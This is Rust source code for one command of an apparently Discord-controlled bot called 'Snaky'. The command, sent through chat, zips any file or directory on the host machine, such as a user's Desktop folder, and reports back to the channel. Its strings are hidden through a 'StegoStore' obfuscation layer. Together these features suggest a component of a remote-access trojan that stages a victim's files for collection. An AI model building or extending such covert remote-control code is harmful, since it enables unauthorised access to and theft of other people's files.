use crate::commands::Arguments;
use crate::commands::BotCommand;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::io::{BufReader, Read, Write};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use walkdir::WalkDir;
use zip::{write::FileOptions, ZipWriter};
use crate::core::stego_store::{StegoStore, StringCategory};

pub struct ZipCommand;

impl ZipCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for ZipCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("ZIP_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(Self::f("ZIP_DESC").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("ZIP_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".zip C:\\Users\\Snaky\\Desktop\\Snaky", ".zip Snaky", ".zip \"Snaky is free\"", ".zip snaky.txt"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("ZIP_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("ZIP_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
        let target = args.rest();
        if target.is_empty() {
            let embed = twilight_util::builder::embed::EmbedBuilder::new()
                    .title(Self::f("ZIP_TITLE"))
                    .description(Self::f("ZIP_DESC"))
                    .color(0xFF6B6B)
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: StegoStore::get(StringCategory::Core, "USAGE"),
                        value: Self::c("ZIP_USAGE"),
                        inline: false,
                    })
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: StegoStore::get(StringCategory::Core, "EXAMPLES"),
                        value: Self::f("ZIP_EXAMPLES"),
                        inline: false,
                    })
                    .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(Self::f("ZIP_FOOTER")))
                    .build();

            http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
            return Ok(());
        }

        self.zip_item(http, msg, &target).await
    }
}

impl ZipCommand {
    const BUFFER_SIZE: usize = 64 * 1024; // 64KB buffer for streaming
    async fn zip_item(&self, http: &Arc<HttpClient>, msg: &Message, target: &str) -> Result<()> {
        let path = PathBuf::from(target);
        if !path.exists() {
            http.create_message(msg.channel_id.get(), &Self::f("ZIP_ERR_NOT_EXIST").replace("{}", target)).await?;
            return Ok(());
        }

        let zip_filename = if path.is_dir() {
            format!(
                "{}.zip",
                path.file_name().unwrap_or_default().to_string_lossy()
            )
        } else {
            format!(
                "{}.zip",
                path.file_stem().unwrap_or_default().to_string_lossy()
            )
        };

        if Path::new(&zip_filename).exists() {
            http.create_message(msg.channel_id.get(), &Self::f("ZIP_ERR_EXISTS").replace("{}", &zip_filename)).await?;
            return Ok(());
        }

        let _thinking_msg = http
            .create_message(msg.channel_id.into(), &Self::f("ZIP_PROGRESS").replace("{}", target)).await?;

        let result = if path.is_file() {
            self.zip_file(&path, &zip_filename)
        } else {
            self.zip_directory(&path, &zip_filename)
        };

        match result {
            Ok(size) => {
                // Get original size for compression ratio
                let original_size = self.get_total_size(&path)?;

                let ratio = if original_size > 0 {
                    if size >= original_size {
                        0.0 // No compression or compression increased size
                    } else {
                        ((original_size - size) as f64 / original_size as f64) * 100.0
                    }
                } else {
                    0.0
                };

                let embed = twilight_util::builder::embed::EmbedBuilder::new()
                    .title(Self::f("ZIP_COMPLETE_TITLE"))
                    .description(&Self::f("ZIP_COMPLETE_DESC").replace("{}", target))
                    .color(0x2ECC71)
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: Self::f("ZIP_OUT_FILE"),
                        value: zip_filename,
                        inline: true,
                    })
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: Self::f("ZIP_ORIG_SIZE"),
                        value: self.format_bytes(original_size),
                        inline: true,
                    })
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: Self::f("ZIP_COMP_SIZE"),
                        value: self.format_bytes(size),
                        inline: true,
                    })
                    .field(twilight_model::channel::message::embed::EmbedField {
                        name: Self::f("ZIP_COMP_RATIO"),
                        value: format!("{:.1}%", ratio),
                        inline: true,
                    })
                    .footer(twilight_util::builder::embed::EmbedFooterBuilder::new(
                        Self::f("ZIP_FOOTER"),
                    ))
                    .build();

                http.create_message_with_embeds(msg.channel_id.get(), &[embed]).await?;
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!("{}: '{}': {}", Self::f("ZIP_ERR_FAIL"), target, e)).await?;
            }
        }

        Ok(())
    }

    fn zip_file(&self, file_path: &Path, output_path: &str) -> Result<u64> {
        let file = fs::File::create(output_path)?;
        let mut zip = ZipWriter::new(file);

        let options = FileOptions::default()
            .compression_method(zip::CompressionMethod::Stored)
            .unix_permissions(0o644);

        let filename = file_path
            .file_name()
            .ok_or_else(|| anyhow::anyhow!("Invalid filename"))?
            .to_string_lossy();

        zip.start_file(filename.as_ref(), options)?;

        let mut reader = BufReader::new(fs::File::open(file_path)?);
        let mut buffer = [0; Self::BUFFER_SIZE];

        loop {
            let bytes_read = reader.read(&mut buffer)?;
            if bytes_read == 0 {
                break;
            }
            zip.write_all(&buffer[..bytes_read])?;
        }

        zip.finish()?;

        Ok(fs::metadata(output_path)?.len())
    }

    fn zip_directory(&self, dir_path: &Path, output_path: &str) -> Result<u64> {
        let file = fs::File::create(output_path)?;
        let mut zip = ZipWriter::new(file);

        let base_dir_name = dir_path
            .file_name()
            .ok_or_else(|| anyhow::anyhow!("Invalid directory name"))?
            .to_string_lossy();

        for entry in WalkDir::new(dir_path).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();
            let relative_path = path.strip_prefix(dir_path)?;

            if path.is_file() {
                let zip_path = Path::new(base_dir_name.as_ref()).join(relative_path);
                let zip_path_str = zip_path.to_string_lossy().replace('\\', "/");

                let options = FileOptions::default()
                    .compression_method(zip::CompressionMethod::Stored)
                    .unix_permissions(0o644);

                zip.start_file(&zip_path_str, options)?;

                let mut reader = BufReader::new(fs::File::open(path)?);
                let mut buffer = [0; Self::BUFFER_SIZE];

                loop {
                    let bytes_read = reader.read(&mut buffer)?;
                    if bytes_read == 0 {
                        break;
                    }
                    zip.write_all(&buffer[..bytes_read])?;
                }
            } else if path.is_dir() && relative_path != Path::new("") {
                // Add directory entry
                let zip_path = Path::new(base_dir_name.as_ref()).join(relative_path);
                let zip_path_str = format!("{}/", zip_path.to_string_lossy().replace('\\', "/"));

                let options = FileOptions::default()
                    .compression_method(zip::CompressionMethod::Stored)
                    .unix_permissions(0o755);

                zip.add_directory(&zip_path_str, options)?;
            }
        }

        zip.finish()?;

        Ok(fs::metadata(output_path)?.len())
    }

    fn get_total_size(&self, path: &Path) -> Result<u64> {
        if path.is_file() {
            Ok(fs::metadata(path)?.len())
        } else {
            let mut total_size = 0;
            for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
                if entry.path().is_file() {
                    total_size += fs::metadata(entry.path())?.len();
                }
            }
            Ok(total_size)
        }
    }

    fn format_bytes(&self, bytes: u64) -> String {
        crate::utils::formatting::format_memory_size(bytes)
    }
}



